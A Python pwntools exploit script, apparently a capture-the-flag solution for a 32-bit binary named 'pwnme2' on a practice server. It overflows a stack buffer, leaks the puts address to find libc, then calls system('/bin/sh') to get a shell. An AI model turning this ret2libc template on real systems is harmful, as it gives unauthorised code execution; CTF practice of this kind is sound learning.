import sys
from pwn import *
from ctypes import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./pwnme2')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./pwnme2')
			libc=ELF('/lib/i386-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',27857)
			elf=ELF('./pwnme2')
			libc=ELF('../../i386libc/x86_libc.so.6')

		start=0x80484D0
		io.recvuntil('Please input:')
		pay='a'*0x70+p32(elf.plt['puts'])+p32(start)+p32(elf.got['puts'])
		io.sendline(pay)


		libc_base=u32(io.recvuntil('\xf7')[-4:])-libc.sym['puts']
		libc.address=libc_base

		io.recvuntil('Please input:')
		pay='a'*0x70+p32(libc.sym['system'])+p32(start)+p32(libc.search('/bin/sh\x00').next())
		io.sendline(pay)





		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive('')

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue